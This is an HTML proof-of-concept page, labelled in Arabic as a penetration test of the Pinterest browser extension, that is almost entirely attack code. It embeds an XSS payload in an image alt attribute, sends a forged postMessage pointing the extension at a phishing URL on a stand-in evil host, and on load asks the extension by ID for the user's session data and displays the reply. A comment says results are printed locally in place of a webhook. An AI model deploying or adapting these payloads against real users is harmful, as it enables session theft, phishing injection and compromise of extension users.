<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Pinterest Security Audit - Local Results</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #1a1a1a; color: #fff; padding: 20px; }
        .container { max-width: 1000px; margin: auto; }
        h1 { color: #e60023; text-align: center; border-bottom: 2px solid #333; padding-bottom: 10px; }
        
        /* تصميم الصورة التوضيحية */
        .test-area { background: #252525; padding: 20px; border-radius: 12px; margin-bottom: 20px; text-align: center; border: 1px solid #444; }
        .target-img { width: 250px; border: 3px solid #e60023; border-radius: 8px; cursor: pointer; transition: 0.3s; }
        .target-img:hover { transform: scale(1.05); box-shadow: 0 0 20px rgba(230, 0, 35, 0.5); }

        /* جدول النتائج */
        .results-table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #2d2d2d; border-radius: 8px; overflow: hidden; }
        .results-table th, .results-table td { padding: 15px; text-align: right; border-bottom: 1px solid #444; }
        .results-table th { background: #e60023; color: white; }
        .status-success { color: #00ff00; font-weight: bold; }
        .status-fail { color: #ff4444; }
        .data-payload { font-family: monospace; background: #000; padding: 5px; color: #0f0; display: block; white-space: pre-wrap; font-size: 12px; }
        
        button { background: #e60023; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
        button:hover { background: #ff1a3c; }
    </style>
</head>
<body>

<div class="container">
    <h1>نتائج فحص اختراق إضافة Pinterest</h1>

    <div class="test-area">
        <h3>منطقة اختبار الحقن (Injection Area)</h3>
        <p>مرر الماوس فوق الصورة واضغط على زر Pinterest لاختبار سحب البيانات</p>
        <img src="https://picsum.photos/400/300" 
             alt='"><img src=x onerror="window.printResult(`XSS_EXECUTION`, `تم تنفيذ كود داخل واجهة الإضافة!`)">' 
             title="TEST_PAYLOAD_V1"
             class="target-img">
        <br><br>
        <button onclick="triggerPostMessage()">اختبار حقن رسائل PostMessage</button>
    </div>

    <table class="results-table">
        <thead>
            <tr>
                <th>نوع الثغرة</th>
                <th>الحالة</th>
                <th>البيانات المستخرجة / النتيجة</th>
            </tr>
        </thead>
        <tbody id="results-body">
            </tbody>
    </table>
</div>

<script>
    const EXTENSION_ID = "gpdjojdkbbmdfjfahjcgigfpmkopogic";

    // دالة لطباعة النتائج في الجدول بدلاً من الويب هوك
    window.printResult = function(type, description, data = null) {
        const tbody = document.getElementById('results-body');
        const row = document.createElement('tr');
        
        let dataHtml = data ? `<code class="data-payload">${JSON.stringify(data, null, 2)}</code>` : description;
        let statusClass = data || type.includes('SUCCESS') ? 'status-success' : 'status-fail';
        let statusText = data || type.includes('SUCCESS') ? 'تمت الاستجابة' : 'لم يتم الرد';

        row.innerHTML = `
            <td><b>${type}</b></td>
            <td class="${statusClass}">${statusText}</td>
            <td>${dataHtml}</td>
        `;
        tbody.prepend(row); // إضافة النتيجة الجديدة في الأعلى
    };

    // 1. اختبار حقن PostMessage
    function triggerPostMessage() {
        printResult("PostMessage Injection", "جاري إرسال رسالة مفخخة للإضافة...");
        window.postMessage({
            type: "PINTEREST_SAVE",
            data: {
                url: "https://evil-site.com/phishing",
                src: "https://picsum.photos/200/200",
                description: "DATA_POISONING_SUCCESS",
                isThroughExtension: true
            }
        }, "*");
    }

    // 2. اختبار التواصل المباشر (Cross-Extension Messaging)
    function testDirectMessage() {
        if (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.sendMessage) {
            chrome.runtime.sendMessage(EXTENSION_ID, { action: "FETCH_USER" }, (response) => {
                if (chrome.runtime.lastError) {
                    printResult("Direct Messaging", "فشل: " + chrome.runtime.lastError.message);
                } else {
                    printResult("Direct Messaging SUCCESS", "تم سحب بيانات الجلسة!", response);
                }
            });
        }
    }

    // تشغيل الفحص التلقائي عند التحميل
    window.onload = () => {
        testDirectMessage();
        
        // استماع للرسائل العائدة من الإضافة (إن وجدت)
        window.addEventListener("message", (event) => {
            if (event.data && event.data.type === "PINTEREST_SAVE_BACK") {
                printResult("Extension Response", "الإضافة ردت على الرسالة المحقونة", event.data);
            }
        });
    };
</script>

</body>
</html>
